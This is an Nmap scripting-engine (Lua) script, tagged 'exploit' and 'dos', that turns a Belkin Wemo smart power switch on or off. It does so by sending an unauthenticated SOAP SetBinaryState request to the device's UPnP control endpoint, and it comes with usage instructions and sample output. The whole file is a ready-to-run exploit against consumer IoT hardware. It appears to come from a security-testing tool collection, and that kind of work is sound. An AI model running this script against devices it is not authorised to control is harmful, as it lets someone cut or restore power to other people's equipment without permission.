local nmap = require "nmap"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local shortport = require "shortport"

description = [[
The Belkin Wemo Switch is a network enabled power outlet. This scripts changes
the switch state (ON/OFF) acording to the argument BinaryState.

There is a separate NSE script that may be used for obtaining information such
as the switch current state, nearby wireless networks and versions.
No authentication is required.

Valid on Belkin Wemo Switch version WeMo_WW_2.00.10966.PVT-OWRT-SNS on 6/22/17

References:
* http://websec.ca/blog/view/Belkin-Wemo-Switch-NMap-Scripts
* https://www.tripwire.com/state-of-security/featured/my-sector-story-root-shell-on-the-belkin-wemo-switch/
* https://www.exploitee.rs/index.php/Belkin_Wemo
]]

---
-- @usage nmap -p49152,49153,49154 --script wemo-switch --script-args BinaryState=1 <target>
--
-- @output
--| wemo-switch:
--|   BinaryState: 1
--|_  Switch is currently turned: ON
--
-- @xmloutput
-- <elem key="BinaryState">1</elem>
-- <elem key="Switch is currently turned">ON</elem>
-- 
-- @args wemo-switch.BinaryState Turn the device ON (1) or OFF (0).
---

author = "Pedro Joaquin <pjoaquin()websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "dos"}

portrule = shortport.portnumber({49152,49153,49154})

local function WemoSwitch(host, port, BinaryState)
  local output = stdnse.output_table()
  local req = '<?xml ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:SetBinaryState xmlns:u="urn:Belkin:service:basicevent1:1"><BinaryState>'..BinaryState..'</BinaryState></u:SetBinaryState></s:Body></s:Envelope>'
  local path = "/upnp/control/basicevent1"
	local options = {header={["SOAPACTION"]='"urn:Belkin:service:basicevent:1#SetBinaryState"', ["Content-Type"]="text/xml"}}
	local result = http.post( host, port, path, options, nil, req)
	stdnse.debug1("Status : %s", result['status-line'] or "No Response")
    if(result['status'] ~= 200 or result['content-length'] == 0) then
	  stdnse.debug1("Status : %s", result['status-line'] or "No Response")
      return nil, "Couldn't open: " .. path
	else
      output["BinaryState"] = result['body']:match("<BinaryState>([^<]*)</BinaryState>")
	  if output["BinaryState"] == "Error" then
	    output["BinaryState"] = BinaryState
	  end
	local bstate="Switch is currently turned"
    if output["BinaryState"] == "1" then
      output[bstate] = "ON"
    else
      output[bstate] = "OFF"
    end
      return output
    end
end

action = function(host,port)
local BinaryState = stdnse.get_script_args('wemo-switch.BinaryState')
  if BinaryState == nil then
    return nil, "You have to specify --script-args BinaryState=1"
  else
      return WemoSwitch(host, port, BinaryState)
  end
end
